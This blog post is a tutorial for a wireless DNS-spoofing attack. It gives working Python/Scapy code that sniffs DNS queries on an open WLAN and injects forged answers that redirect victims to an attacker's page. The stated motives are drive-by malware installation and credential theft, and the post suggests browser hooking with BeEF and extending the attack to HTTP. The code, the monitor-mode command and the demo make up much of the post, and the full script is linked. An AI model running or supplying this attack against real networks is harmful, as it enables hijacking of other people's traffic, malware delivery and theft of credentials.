---
layout: post
title: "Wireless Attacks with Python: Part One - The \"Dnspwn Attack\""
date: 2013-11-15 20:45
comments: true
published: true
categories:
- wireless
- python
- security
---

<img src="{{root_url}}/images/headers/wireless_python.png"/>

### Introduction
A while back, I [published a post](http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html) on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the [aircrack suite](http://www.aircrack-ng.org/).

So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.
<!--more-->
### The "Dnspwn Attack"
The first attack we'll explore is what I call the "dnspwn attack" (since, from what I can tell, this attack was first created targeting HTTP with the "[airpwn](http://airpwn.sourceforge.net/Airpwn.html)" tool, and later extended to DNS) The idea behind the attack is pretty simple:

Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob's computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob's credentials.

To do this, she remembers that she can sniff all requests coming to and from Bob's computer. She also knows that she is *closer* to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server *before* the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob's computer will likely ignore any further traffic received, including the real response!

Let's see what this would look like:

<a href="{{root_url}}/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="{{root_url}}/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a>


So, now that we know how the attack works, let's automate it!

### Setting up the Alfa AWUS06H

As was the case in my Raidersec post, we will be using the handy [Alfa AWUS036H](http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8) for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the ```demo_insecure``` network.

```
root@bt:~# airmon-ng start wlan0
```

Now that we have monitor mode up and running on ```mon0```, let's start coding!

### Coding the Attack

We will utilize the ```scapy``` module to perform the attack. Let's start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called ```send_response``` that we will make later:

```
from scapy.all import *

sniff(prn=lambda x: send_response(x),
	lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)
```

Now let's create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:

* 802.11 Frame - Change the "to-ds" flag to "from-ds" (our request will now be coming *from* the access point)
* 802.11 Frame - Switch the source and destination MAC addresses
* IP Layer - Switch the source and destination IP addresses
* UDP layer - Switch the source and destination ports
* DNS layer - Set the "answer" flag(s), and append our spoofed answer

Fortunately, ```scapy``` makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are *4* MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here's the code:

```
def send_response(x):
	# Get the requested domain
	req_domain = x[DNS].qd.qname
	spoofed_ip = '192.168.2.1'
	# Let's build our response from a copy of the original packet
	response = x.copy()
	# We need to start by changing our response to be "from-ds", or from the access point.
	response.FCfield = 2L
	# Switch the MAC addresses
	response.addr1, response.addr2 = x.addr2, x.addr1
	# Switch the IP addresses
	response.src, response.dst = x.dst, x.src
	# Switch the ports
	response.sport, response.dport = x.dport, x.sport
	# Set the DNS flags
	response[DNS].qr = 1L
	response[DNS].ra = 1L
	response[DNS].ancount = 1
```

Now that we've set all the flags, let's create and append the DNS answer:

```
response[DNS].an = DNSRR(
	rrname = req_domain,
	type = 'A',
	rclass = 'IN',
	ttl = 900,
	rdata = spoofed_ip
	)
```

And, finally, we inject the spoofed response:

```
sendp(response)
```

That's all there is to it! You can find the full source on [Github](https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py).

### Demo
For the demo, I have the following HTML response available on the host 192.168.2.138:

```
<html>
<head></head>
<body>
	Owned.
</body>
</html>
```

It's worth noticing that we can have *any* HTML, Javascript, etc. we want. It would be trivial to hook the browser using the [BeEF framework](http://beefproject.com/), for example.

Here's a screenshot of it in action (I am using my iPhone as the victim):

<a href="{{root_url}}/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="{{root_url}}/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
<a href="{{root_url}}/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="{{root_url}}/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a>

### Conclusion & Future Improvements
It's important to note that this attack will work just as well on other simple request/response protocols. For example, the original "airpwn" attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:

* Match requests against regular expressions (for example, only replacing Javascript content)
* Set options from arguments / Read configuration information from a file
* Implement the attack for other protocols (ie HTTP).

Enjoy!

Jordan ([@jw_sec](http://twitter.com/jw_sec))
